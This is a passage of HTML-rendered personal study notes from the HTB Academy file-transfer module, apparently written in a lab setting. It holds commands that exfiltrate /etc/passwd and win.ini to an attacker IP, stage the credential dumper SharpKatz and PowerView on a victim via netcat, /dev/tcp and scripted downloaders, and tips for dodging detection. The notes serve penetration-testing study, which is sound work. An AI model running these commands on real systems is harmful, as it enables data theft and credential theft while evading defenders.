style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>Save it as <code>wget.js</code></p>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\htb&gt; cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1</span><br></span></code></pre></div></div>
<ul>
<li>Visual Basic (VBScript)</li>
</ul>
<div class="language-vbscript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-vbscript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">xHttp.Open &quot;GET&quot;, WScript.Arguments.Item(0), False</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">xHttp.Send</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">with bStrm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    .type = 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    .open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    .write xHttp.responseBody</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    .savetofile WScript.Arguments.Item(1), 2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">end with</span><br></span></code></pre></div></div>
<p>Save it as <code>wget.vbs</code> and use it:</p>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\htb&gt; cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1</span><br></span></code></pre></div></div>
<p>We can use any programming language to perform upload operations, for example Python:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 -c &#x27;import requests;requests.post(&quot;http://192.168.49.128:8000/upload&quot;,files={&quot;files&quot;:open(&quot;/etc/passwd&quot;,&quot;rb&quot;)})&#x27;</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="other-transfers">Other transfers<a href="#other-transfers" class="hash-link" aria-label="Direct link to Other transfers" title="Direct link to Other transfers">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="netcat-nc">Netcat (nc)<a href="#netcat-nc" class="hash-link" aria-label="Direct link to Netcat (nc)" title="Direct link to Netcat (nc)">​</a></h3>
<p>Victim machine:</p>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nc -l -p 8000 &gt; SharpKatz.exe</span><br></span></code></pre></div></div>
<p>Attacker machine:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">adriangalera@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">adriangalera@htb[/htb]$ nc -q 0 192.168.49.128 8000 &lt; SharpKatz.exe</span><br></span></code></pre></div></div>
<p>There might be variations of the commands to use depending if the binary is <code>nc</code> or <code>ncat</code>.</p>
<p>Additionally, we can have nc + /dev/tcp combination:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat &lt; /dev/tcp/192.168.49.128/443 &gt; SharpKatz.exe</span><br></span></code></pre></div></div>
<p>This will download to the IP, download file and save it as <code>SharpKatz.exe</code>.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="winrm">WinRM<a href="#winrm" class="hash-link" aria-label="Direct link to WinRM" title="Direct link to WinRM">​</a></h3>
<p>WinRM is some sort of SSH for Windows.</p>
<p>To start, confirm the connection can be executed with WinRM:</p>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\htb&gt; Test-NetConnection -ComputerName DATABASE01 -Port 5985</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ComputerName     : DATABASE01</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RemoteAddress    : 192.168.1.101</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RemotePort       : 5985</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">InterfaceAlias   : Ethernet0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SourceAddress    : 192.168.1.100</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">TcpTestSucceeded : True</span><br></span></code></pre></div></div>
<p>Now, we&#x27;ll define a session variable that we can reuse:</p>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$Session = New-PSSession -ComputerName DATABASE01</span><br></span></code></pre></div></div>
<p>Copy from attacker to victim:</p>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\htb&gt; Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\</span><br></span></code></pre></div></div>
<p>Copy from victim to attacker:</p>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\htb&gt; Copy-Item -Path &quot;C:\Users\Administrator\Desktop\DATABASE.txt&quot; -Destination C:\ -FromSession $Session</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="rdp">RDP<a href="#rdp" class="hash-link" aria-label="Direct link to RDP" title="Direct link to RDP">​</a></h3>
<p>Use copy-paste in the Remote Desktop Protocol (RDP).</p>
<p>If copy-past do not work, we can mount a disk using RDP.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rdesktop 10.10.10.132 -d HTB -u administrator -p &#x27;Password0@&#x27; -r disk:linux=&#x27;/home/user/rdesktop/files&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:&#x27;Password0@&#x27; /drive:linux,/home/plaintext/htb/academy/filetransfer</span><br></span></code></pre></div></div>
<p>Later, when we use the remote desktop, we can reach the shared disk in <code>\\tsclient\</code>.</p>
<p>For Windows, we can use the application mstsc.exe remote desktop client.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="protect-file-transfers">Protect file transfers<a href="#protect-file-transfers" class="hash-link" aria-label="Direct link to Protect file transfers" title="Direct link to Protect file transfers">​</a></h2>
<p>Specially when dealing with sensitive data, it is recommended to encrypt the data before the transfer.</p>
<p>In Windows, we can use <a href="https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1" target="_blank" rel="noopener noreferrer">https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1</a> to encrypt the files with AES.</p>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\htb&gt; Import-Module .\Invoke-AESEncryption.ps1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\htb&gt; Invoke-AESEncryption -Mode Encrypt -Key &quot;p4ssw0rd&quot; -Path .\scan-results.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">File encrypted to C:\htb\scan-results.txt.aes</span><br></span></code></pre></div></div>
<p>In Linux, we can use <code>openssl</code> to encrypt the data:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">adriangalera@htb[/htb]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc</span><br></span></code></pre></div></div>
<p>and decrypt it in the other side:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">adriangalera@htb[/htb]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd                    </span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="living-off-the-land">Living off the land<a href="#living-off-the-land" class="hash-link" aria-label="Direct link to Living off the land" title="Direct link to Living off the land">​</a></h2>
<p>Some binary programs can be used to perform more tasks than intended. Some of these tasks are:</p>
<ul>
<li>Download</li>
<li>Upload</li>
<li>Command Execution</li>
<li>File R/W</li>
<li>Bypass</li>
</ul>
<p>We can check if the binaries we have access can be used to do download or upload operations in the following websites:</p>
<ul>
<li><a href="https://lolbas-project.github.io/" target="_blank" rel="noopener noreferrer">https://lolbas-project.github.io/</a> for Windows</li>
<li><a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">https://gtfobins.github.io/</a> for Linux</li>
</ul>
<p>For example, we can use <code>certreq.exe</code> to upload files:</p>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\htb&gt; certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)</span><br></span></code></pre></div></div>
<p>Or another example, we can use <code>openssl</code> to serve files:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem &lt; /tmp/LinEnum.sh</span><br></span></code></pre></div></div>
<p>And download it in the other side:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">openssl s_client -connect 10.10.10.32:80 -quiet &gt; LinEnum.sh</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="detection">Detection<a href="#detection" class="hash-link" aria-label="Direct link to Detection" title="Direct link to Detection">​</a></h2>
<p>Usually there are mechanism to prevent this kind of file transfer. Most common tools to perform file transfer reveals known <code>User-Agents</code>.</p>
<p>In order to avoid detection, a good idea might be to change the user agent of the tool used (if possible).</p>
<p>Additionally, the mere execution of a blacklisted binary, might trigger some alarms.</p>
<p>We can use GTFOBins or LOLBas to find binaries that will do the thing we need and are not blacklisted.</p></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/Hacking/HTB Academy/File inclusion"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">File inclusion</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/Hacking/HTB Academy/Introduction to Active Directory"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Introduction to Active Directory</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#windows" class="table-of-contents__link toc-highlight">Windows</a><ul><li><a href="#base64" class="table-of-contents__link toc-highlight">Base64</a></li><li><a href="#powershell-web-downloads" class="table-of-contents__link toc-highlight">Powershell Web Downloads</a></li><li><a href="#smb-downloads" class="table-of-contents__link toc-highlight">SMB Downloads</a></li><li><a href="#ftp-downloads" class="table-of-contents__link toc-highlight">FTP Downloads</a></li><li><a href="#powershell-web-uploads" class="table-of-contents__link toc-highlight">PowerShell Web Uploads</a></li><li><a href="#smb-uploads" class="table-of-contents__link toc-highlight">SMB Uploads</a></li><li><a href="#ftp-uploads" class="table-of-contents__link toc-highlight">FTP Uploads</a></li></ul></li><li><a href="#linux" class="table-of-contents__link toc-highlight">Linux</a><ul><li><a href="#base64-1" class="table-of-contents__link toc-highlight">Base64</a></li><li><a href="#curlwget" class="table-of-contents__link toc-highlight">curl/wget</a></li><li><a href="#fileless-operations" class="table-of-contents__link toc-highlight">Fileless operations</a></li><li><a href="#download-with-bash" class="table-of-contents__link toc-highlight">Download with Bash</a></li><li><a href="#ssh" class="table-of-contents__link toc-highlight">SSH</a></li><li><a href="#web-upload" class="table-of-contents__link toc-highlight">Web upload</a></li><li><a href="#multiple-web-servers" class="table-of-contents__link toc-highlight">Multiple web servers</a></li></ul></li><li><a href="#transfer-files-with-code" class="table-of-contents__link toc-highlight">Transfer files with code</a></li><li><a href="#other-transfers" class="table-of-contents__link toc-highlight">Other transfers</a><ul><li><a href="#netcat-nc" class="table-of-contents__link toc-highlight">Netcat (nc)</a></li><li><a href="#winrm" class="table-of-contents__link toc-highlight">WinRM</a></li><li><a href="#rdp" class="table-of-contents__link toc-highlight">RDP</a></li></ul></li><li><a href="#protect-file-transfers" class="table-of-contents__link toc-highlight">Protect file transfers</a></li><li><a href="#living-off-the-land" class="table-of-contents__link toc-highlight">Living off the land</a></li><li><a href="#detection" class="table-of-contents__link toc-highlight">Detection</a></li></ul></div></div></div></div></main></div></div></div></div>
</body>
</html>